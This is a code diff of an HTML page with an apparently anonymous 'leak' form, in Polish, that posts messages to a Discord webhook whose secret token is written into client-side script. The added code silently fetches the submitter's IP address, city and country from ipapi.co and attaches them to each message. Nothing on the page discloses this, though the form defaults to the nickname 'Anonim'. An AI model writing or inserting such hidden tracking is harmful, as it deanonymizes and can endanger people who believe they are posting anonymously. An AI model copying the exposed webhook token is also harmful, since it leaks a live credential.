@@ -62,54 +62,69 @@
     <div class="status" id="status"></div>
   </div>
 
-  <script>
-    const webhookURL = 'https://discord.com/api/webhooks/1391554398278385754/LRqlcru1aeh627xr_DXpyJ8JRvBshtnY1ENqcTWkigFQWA7Abt9Dojkwzm22M4-dfQnr';
-    let canSend = true;
+<script>
+  const webhookURL = 'https://discord.com/api/webhooks/1391554398278385754/LRqlcru1aeh627xr_DXpyJ8JRvBshtnY1ENqcTWkigFQWA7Abt9Dojkwzm22M4-dfQnr';
+  let canSend = true;
 
-    function sendMessage() {
-      const nick = document.getElementById('nick').value.trim() || 'Anonim';
-      const message = document.getElementById('message').value.trim();
-      const status = document.getElementById('status');
+  async function sendMessage() {
+    const nick = document.getElementById('nick').value.trim() || 'Anonim';
+    const message = document.getElementById('message').value.trim();
+    const status = document.getElementById('status');
 
-      if (!message) {
-        status.textContent = 'Wiadomość nie może być pusta.';
-        status.style.color = 'orange';
-        return;
-      }
-
-      if (!canSend) {
-        status.textContent = 'Poczekaj chwilę przed kolejnym wysłaniem (30s).';
-        status.style.color = 'orange';
-        return;
-      }
-
-      const content = `❤️‍🩹 **${nick}** ❤️‍🩹 zleakował:\n${message}`;
-
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content })
-      })
-      .then(response => {
-        if (response.ok) {
-          status.textContent = 'Wiadomość została wysłana!';
-          status.style.color = 'lightgreen';
-          document.getElementById('message').value = '';
-          canSend = false;
-          setTimeout(() => {
-            canSend = true;
-            status.textContent = '';
-          }, 30000); // 30 sekund
-        } else {
-          status.textContent = 'Błąd podczas wysyłania wiadomości.';
-          status.style.color = 'red';
-        }
-      })
-      .catch(error => {
-        status.textContent = 'Nie udało się połączyć z webhookiem.';
-        status.style.color = 'red';
-      });
+    if (!message) {
+      status.textContent = 'Wiadomość nie może być pusta.';
+      status.style.color = 'orange';
+      return;
     }
+
+    if (!canSend) {
+      status.textContent = 'Poczekaj chwilę przed kolejnym wysłaniem (30s).';
+      status.style.color = 'orange';
+      return;
+    }
+
+    // 🔍 Pobierz dane IP i lokalizację
+    let ip = 'Nieznany';
+    let country = 'Nieznany';
+    let city = 'Nieznane';
+
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+      ip = data.ip || ip;
+      country = data.country_name || country;
+      city = data.city || city;
+    } catch (e) {
+      console.warn('Nie udało się pobrać danych geolokalizacji.');
+    }
+
+    const content = `❤️‍🩹 **${nick}** ❤️‍🩹 zleakował:\n${message}\n\n🌐 IP: ${ip}\n🏙️ Lokalizacja: ${city}, ${country}`;
+
+    fetch(webhookURL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content })
+    })
+    .then(response => {
+      if (response.ok) {
+        status.textContent = 'Wiadomość została wysłana!';
+        status.style.color = 'lightgreen';
+        document.getElementById('message').value = '';
+        canSend = false;
+        setTimeout(() => {
+          canSend = true;
+          status.textContent = '';
+        }, 30000); // 30 sekund
+      } else {
+        status.textContent = 'Błąd podczas wysyłania wiadomości.';
+        status.style.color = 'red';
+      }
+    })
+    .catch(error => {
+      status.textContent = 'Nie udało się połączyć z webhookiem.';
+      status.style.color = 'red';
+    });
+  }
   </script>
-</body>
+ </body>
 </html>
